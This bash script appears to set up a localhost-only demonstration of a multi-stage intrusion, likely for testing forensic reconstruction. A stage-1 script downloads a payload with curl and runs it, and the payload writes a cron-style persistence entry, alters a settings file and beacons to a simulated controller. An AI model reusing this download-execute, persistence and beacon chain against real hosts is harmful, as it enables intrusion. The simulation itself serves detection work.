#!/usr/bin/env bash
# Scenario 5: Multi-stage intrusion (reconstruction demonstration)
#   suspicious script -> child downloads payload -> payload is executed ->
#   payload changes files -> payload opens an outbound connection.
# Everything stays on this machine: both "remote" hosts are local Python servers
# bound to 127.0.0.1, and the only files touched are in the work directory.
set -e

WORKDIR="/tmp/ft_scenario05"
rm -rf "$WORKDIR"; mkdir -p "$WORKDIR/www" "$WORKDIR/victim"; cd "$WORKDIR"

echo "user=alice" > victim/settings.conf

cat > www/update.sh <<'EOF'
#!/bin/sh
# Simulated payload: persists, alters a setting, then contacts its controller.
echo "@reboot /tmp/ft_scenario05/update.sh" > /tmp/ft_scenario05/victim/persistence.cron
echo "remote_access=enabled" >> /tmp/ft_scenario05/victim/settings.conf
curl -s -o /dev/null "http://127.0.0.1:8768/beacon"
EOF

cat > stage1.sh <<'EOF'
#!/bin/bash
# The suspicious script the user runs: fetch the payload, then start it.
curl -s -o /tmp/ft_scenario05/update.sh "http://127.0.0.1:8767/update.sh"
chmod +x /tmp/ft_scenario05/update.sh
/tmp/ft_scenario05/update.sh
EOF

python3 -m http.server 8767 --bind 127.0.0.1 --directory "$WORKDIR/www" >/dev/null 2>&1 &
DROPPER=$!
python3 -m http.server 8768 --bind 127.0.0.1 --directory "$WORKDIR/www" >/dev/null 2>&1 &
CONTROLLER=$!
sleep 0.5

bash stage1.sh

kill $DROPPER $CONTROLLER 2>/dev/null || true
wait $DROPPER $CONTROLLER 2>/dev/null || true
